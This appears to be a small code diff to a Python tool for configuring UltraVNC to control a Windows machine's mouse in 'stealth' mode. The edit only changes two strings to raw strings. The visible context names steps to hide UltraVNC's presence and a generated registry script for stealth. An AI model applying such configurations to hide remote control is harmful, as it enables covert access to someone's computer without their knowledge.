@@ -145,7 +145,7 @@ class UltraVNCStealthMouse:
         print("🕵️ Configuring UltraVNC for Stealth Mouse Control")
         print("=" * 50)
         
-        config_instructions = '''
+        config_instructions = r'''
 UltraVNC Server Stealth Configuration:
 
 1. Hide UltraVNC Presence:
@@ -186,7 +186,7 @@ Registry Keys for Stealth:
         print(config_instructions)
         
         # Generate registry script
-        reg_script = '''
+        reg_script = r'''
 Windows Registry Editor Version 5.00
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3]
